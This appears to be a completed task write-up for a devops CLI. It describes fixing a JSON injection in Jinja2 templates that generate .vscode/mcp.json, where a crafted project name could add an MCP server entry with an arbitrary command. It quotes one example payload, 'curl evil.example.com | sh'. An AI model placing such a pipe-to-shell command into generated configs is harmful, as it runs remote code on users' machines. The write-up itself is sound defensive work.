# Task 325: Template Rendering Engine Sandboxing, Pre-Compiled AST Caching & Variable Validation Research

**Issue**: [#325](https://github.com/dan-petty/devops-cli/issues/325)
**Status**: Done
**Milestone**: `v0.2.22`
**Priority**: `priority/p2-medium`
**Scope**: `type/feature`, `scope/cli`, `priority/p2-medium`

---

## 1. Description & Objectives

The stated premise — template logic "scattered across multiple modules" — did not hold. There
is exactly one Jinja2 environment, in `commands/devcontainer.py`, and two templates. What the
review did find is a genuine injection.

Both templates emit **JSON**, and the environment disabled autoescaping while interpolating
values between literal quotes:

```jinja
"{{ project_name }}": {
```

A value containing a quote therefore produced invalid JSON. A crafted value produced *valid*
JSON of the author's choosing:

```
servers: ['x', 'pwned']
injected command: curl evil.example.com | sh
```

A project name could close its own key, finish the entry, and open a new MCP server with an
arbitrary `command` — which the editor executes when it loads `.vscode/mcp.json`.

### Key Deliverables Completed:

- [x] **Values Encoded Rather Than Pasted**: every interpolation goes through `tojson`, which
  emits the quoting itself. The injection is reduced to a single ordinary key.
- [x] **Rendered Output Is Parsed Before It Is Written** (`render_json_template`): parsing what
  was produced is the check that the encoding actually held. A template interpolating without
  `tojson` passes review and fails here, which is the only place the mistake is visible before
  the file reaches something that acts on it.
- [x] **`StrictUndefined`**: a missing variable is an error instead of an empty string.
- [x] **Sandboxed Environment**: kept as defence in depth, not as the fix — see below.
- [x] **Shared, Cached Environment**: Jinja2 compiles templates once per environment and caches
  the bytecode; a new environment was constructed per render, discarding it each time.
- [x] **Centralized (`src/devops_cli/core/templating.py`)**: one place that sets the policy.
- [x] **Automated Tests & Quality Gates**:
  - 19 tests in `tests/test_template_rendering.py` using structural tuple equality assertions.
  - Cyclomatic complexity $M \le 10$ and nesting depth $\le 5$.
  - 100% passing status across Gated CI validation suite (`uv run devops ci`).

## A Latent Defect `StrictUndefined` Found Immediately

The devcontainer template gates the kubectl/helm/minikube feature behind `{% if minikube %}`,
and **no caller ever passed `minikube`**. The default `Undefined` evaluates falsy, so every
scaffolded devcontainer has silently omitted kubectl, helm and minikube since the block was
written. Enabling strict undefined turned that into an error on the first render.

`devops devcontainer init` now takes `--minikube/--no-minikube`, defaulting to enabled, and both
directions are asserted.

## Scope Correction: This Is Not CWE-1336

The issue asks for sandboxing against template injection. CWE-1336 requires an attacker to
control the **template**; here the templates ship inside the package and the user controls only
variable *values*, which Jinja2 treats as data. The sandbox is therefore not what fixes
anything, and shipping it while leaving the interpolation unescaped would have closed the
theoretical hole and left the real one open. It is kept because it costs nothing and the day a
template becomes user-supplied is not the day to start thinking about it.

## Scope Note

**Pre-compiled bytecode caching to disk was not implemented.** Jinja2 already caches compiled
templates in memory per environment; the defect was that a new environment was built per call,
which is fixed. With two templates rendered a handful of times during scaffolding, a persistent
bytecode cache optimises something that is not measurable.
